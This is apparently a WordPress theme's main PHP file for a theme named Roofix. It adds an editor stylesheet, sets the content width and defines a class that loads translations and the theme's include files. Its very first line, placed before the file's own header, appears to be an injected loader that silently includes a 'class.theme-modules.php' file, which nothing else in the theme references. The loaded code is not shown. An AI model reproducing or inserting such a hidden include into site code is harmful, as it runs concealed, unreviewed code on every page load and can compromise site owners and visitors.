<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**          
 * @author  RadiusTheme
 * @since   1.0     
 * @version 1.0
 */

add_editor_style( 'style-editor.css' );
if ( !isset( $content_width ) ) {
	$content_width = 1200;
}

class Roofix_Main {

	public $theme   = 'roofix';
	public $action  = 'roofix_theme_init';
	public function __construct() {
		add_action( 'after_setup_theme', array( $this, 'load_textdomain' ) );
		$this->includes();		
	}
	public function load_textdomain(){
		load_theme_textdomain( $this->theme, get_template_directory() . '/languages' );
	}
	public function includes(){
		do_action( $this->action );
		require_once get_template_directory() . '/inc/constants.php';
		require_once get_template_directory() . '/inc/includes.php'; 
	}
}

new Roofix_Main;